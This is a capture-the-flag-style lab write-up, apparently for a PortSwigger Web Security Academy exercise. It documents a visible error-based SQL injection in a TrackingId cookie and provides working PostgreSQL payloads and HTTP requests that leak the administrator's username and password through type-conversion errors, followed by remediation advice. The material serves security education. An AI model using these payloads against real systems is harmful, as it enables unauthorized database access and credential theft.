
---
# Visible Error-Based SQL Injection in TrackingId Cookie allows Credential Disclosure

## 1. Executive Summary

A visible error-based SQL injection vulnerability exists in the application's `TrackingId` cookie. The application exposes verbose database errors containing portions of the executed SQL query and attacker-controlled data, allowing an attacker to manipulate the query and intentionally cause database type-conversion errors that disclose usernames and passwords from the `users` table.

## 2. Vulnerability Details

- **Vulnerability Type:** Visible Error-Based SQL Injection
    
- **Target Endpoint/URL:** `/`
    
- **Affected Parameter(s):** `TrackingId` cookie
    
- **Authentication Level Required:** Unauthenticated
    
- **Database:** PostgreSQL
    

The application incorporates the `TrackingId` cookie into a SQL query without proper parameterization and exposes verbose database error messages.

The error messages reveal information such as:

- The SQL query being executed.
    
- Syntax errors caused by attacker-controlled input.
    
- Database type-conversion errors.
    
- Values returned by injected subqueries.
    

This allows an attacker to intentionally cast sensitive database values to an incompatible data type, causing PostgreSQL to include those values in the resulting error message.

## 3. Steps to Reproduce (STR)

### Step 1 — Identify the verbose SQL error

1. Open the PortSwigger lab using Burp Suite's built-in browser.
    
2. Browse the application.
    
3. Open **Proxy → HTTP history**.
    
4. Locate the `GET /` request containing a `TrackingId` cookie.
    
5. Send the request to **Burp Repeater**.
    
6. Append a single quote to the `TrackingId` value.
    

For example:

```
TrackingId=ogAZZfxtOKUELbuJ'
```

7. Send the request.
    
8. Observe the verbose database error.
    
9. The error reveals the SQL query and indicates an **unclosed string literal**.
    
10. This confirms that the cookie value is being incorporated into a SQL query inside a quoted string.
    

### Step 2 — Make the injected query syntactically valid

11. Add SQL comment characters after the injected quote:
    

```
TrackingId=ogAZZfxtOKUELbuJ'--
```

12. Send the request.
    
13. Observe that the SQL error disappears.
    
14. This indicates that the remaining portion of the original query has been commented out.
    

### Step 3 — Test a generic subquery

15. Modify the payload to include a subquery and cast its result to an integer:
    

```
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
```

16. Send the request.
    
17. Observe a different error indicating that the `AND` condition must evaluate to a Boolean expression.
    
18. This confirms that the injected SQL is being processed by the database.
    

### Step 4 — Correct the Boolean condition

19. Modify the condition so that it compares two values:
    

```
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```

20. Send the request.
    
21. Observe that the error disappears.
    
22. This confirms that the modified query is syntactically valid.
    

### Step 5 — Retrieve a username through an error

23. Modify the subquery to retrieve usernames:
    

```
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
```

24. Send the request.
    
25. Observe that an error is returned.
    
26. Notice that the request may have been truncated because of the application's character limit.
    
27. The truncation can prevent the trailing comment characters from reaching the SQL parser.
    
28. Remove the original `TrackingId` value to reduce the payload length:
    

```
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
```

29. Send the request again.
    
30. Observe a database error indicating that the query returned more than one row.
    
31. This confirms that the query is executing successfully and that the `users` table contains multiple rows.
    

### Step 6 — Restrict the query to one row

32. Modify the subquery to return only one row:
    

```
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

33. Send the request.
    
34. Observe an error similar to:
    

```
ERROR: invalid input syntax for type integer: "administrator"
```

35. The database attempted to convert the username `administrator` to an integer.
    
36. The failed conversion causes PostgreSQL to disclose the username in the error message.
    

### Step 7 — Retrieve the administrator password

37. Modify the subquery to retrieve the password:
    

```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

38. Send the request.
    
39. Observe that the database error contains the administrator's password.
    
40. Record the disclosed password.
    

### Step 8 — Authenticate as administrator

41. Navigate to the application's login page.
    
42. Enter:
    

```
Username: administrator
Password: <disclosed-password>
```

43. Submit the login form.
    
44. Confirm successful authentication as the administrator.
    
45. The PortSwigger lab is solved.
    

## 4. Proof of Concept (PoC)

### HTTP Request/Response

#### Trigger the initial SQL error

```
GET / HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: TrackingId=ogAZZfxtOKUELbuJ'
```

The application returns a verbose SQL error indicating an unclosed string literal.

#### Comment out the remaining query

```
GET / HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: TrackingId=ogAZZfxtOKUELbuJ'--
```

The error disappears, indicating that the injected query is syntactically valid.

#### Test a type conversion

```
GET / HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```

This establishes a valid SQL expression involving a subquery and integer conversion.

#### Extract the username

```
GET / HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

The database attempts:

```
CAST('administrator' AS int)
```

which produces an error similar to:

```
ERROR: invalid input syntax for type integer: "administrator"
```

The error therefore discloses the username.

#### Extract the password

```
GET / HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

The resulting database error exposes the password value because PostgreSQL includes the invalid value in its type-conversion error.

### Evidence (Screenshots/Video)



## 5. Impact Analysis

- **Technical Impact:** An unauthenticated attacker can exploit the `TrackingId` cookie to manipulate the backend SQL query and intentionally trigger verbose PostgreSQL errors. These errors disclose database values, allowing the attacker to retrieve the administrator username and password.
    
- **Business Impact:** Exposure of administrator credentials can result in complete compromise of the affected application. An attacker can authenticate as a privileged user and potentially access sensitive information, modify application data, manage users, and perform other administrative actions.
    

The critical issue is the combination of **SQL injection + verbose database error disclosure**, which turns database errors into a direct data-extraction mechanism.

## 6. Remediation & References

- **Suggested Fix:** Use parameterized queries/prepared statements for all database operations involving the `TrackingId` cookie.
    

For example:

```
cursor.execute(
    "SELECT ... WHERE tracking_id = %s",
    (tracking_id,)
)
```

Additionally:

- Never concatenate user-controlled cookie values into SQL statements.
    
- Disable verbose database errors in production.
    
- Return generic application-level error messages to clients.
    
- Log detailed database errors only on the server side.
    
- Apply least-privilege permissions to the database account.
    
- Store passwords using strong, salted password-hashing algorithms rather than plaintext.
    
- Implement appropriate input validation as defense in depth.
    

- **References:**
    
    - OWASP Top 10: A03 — Injection
        
    - OWASP SQL Injection Prevention Cheat Sheet
        
    - CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
        
    - CWE-209: Generation of Error Message Containing Sensitive Information
        
    - PortSwigger Web Security Academy — Visible Error-Based SQL Injection